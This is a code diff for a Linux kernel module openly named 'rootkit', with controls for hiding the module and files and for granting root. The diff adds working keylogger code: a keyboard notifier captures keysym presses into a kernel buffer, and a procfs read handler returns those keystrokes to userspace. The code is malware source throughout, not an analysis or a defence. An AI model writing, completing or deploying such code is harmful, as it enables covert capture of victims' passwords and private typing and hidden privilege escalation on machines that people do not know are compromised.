@@ -9,6 +9,7 @@
 #include <linux/list.h>
 #include <linux/mutex.h>
 #include <linux/keyboard.h>
+#include <linux/uaccess.h>
 
 #define CONTROL_DIR "harmless_file"
 #define HIDE_MODULE_FILE "hide_module"
@@ -16,6 +17,7 @@
 #define HIDE_FILE_FILE "hide_file"
 #define GIVE_ROOT_FILE "gimme_root"
 #define KEYLOGGER_FILE "keylogger"
+#define KEYLOGGER_LOG_SIZE 2048
 
 #define MODULE_NAME "rootkit"
 
@@ -80,6 +82,9 @@ static struct list_head *banned_files;
 
 
 static struct notifier_block keylogger;
+//meh
+static char keylogger_log[KEYLOGGER_LOG_SIZE];
+static int keylogger_log_len;
 static int keylogger_on=0;
 
 LIST_HEAD(hidden_pid_list);
@@ -623,11 +628,32 @@ static struct proc_dir_entry* create_procfs_entry(const char* name, umode_t mode
 
 int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param){
 	struct keyboard_notifier_param *param  = _param;
-	printk("NOTIFIER CALLED XOXOXOXOXO");
-	printk("down: %d key: %u", param->down, param->value);
+	char buf[128];
+	int len;
+	//so basically we are saving keysym into our procfs file
+	//its worth to remember that the file size is limited
+	//if we want to extract the characters pressed we should use some userspace tool
+	if(code == KBD_KEYSYM){
+
+		printk(KERN_INFO"keysym");
+		printk(KERN_INFO"down: %d key: %x", param->down, param->value);
+		sprintf(buf, "%d, %u\n", param->down, param->value);
+		len = strlen(buf);
+
+		if(len + keylogger_log_len > KEYLOGGER_LOG_SIZE){
+			memset(keylogger_log,0,  KEYLOGGER_LOG_SIZE);
+			keylogger_log_len=0;
+		}
+
+		strcat(keylogger_log, buf);
+		keylogger_log_len+=len;
+		
+	}
+
 	return NOTIFY_OK;
 
 }
+
 static void disable_keylogger(void){
 	if(!keylogger_on){
 		return;
@@ -665,8 +691,17 @@ static int keylogger_write(struct file* file, const char __user * buf, unsigned 
 
 static int keylogger_read(char *buffer, char **buffer_location, off_t off, int count, int *eof , void *data){
 	
+	int ret;
+
+	if(off<keylogger_log_len){
+		ret = min((int)(keylogger_log_len-off),count);
+		memcpy(buffer, keylogger_log+off,ret);
+
+	}else{
+		ret =0 ;
+	}	
 			
-	return count;
+	return ret;
 }
 
 static int control_init(void){
@@ -731,7 +766,10 @@ static void proc_cleanup(void){
 
 static void keylogger_init(void){
 	keylogger.notifier_call = keylogger_notify ; 
+	memset(keylogger_log,0,KEYLOGGER_LOG_SIZE);
+	keylogger_log_len=0;
 	enable_keylogger();
+
 }
 
 static void keylogger_cleanup(void){
@@ -748,7 +786,6 @@ static int __init m_init(void){
 }
 
 static void __exit m_exit(void){
-	keylogger_cleanup();
 	keylogger_cleanup();
 	clear_hooked_dirs();
 	proc_cleanup();
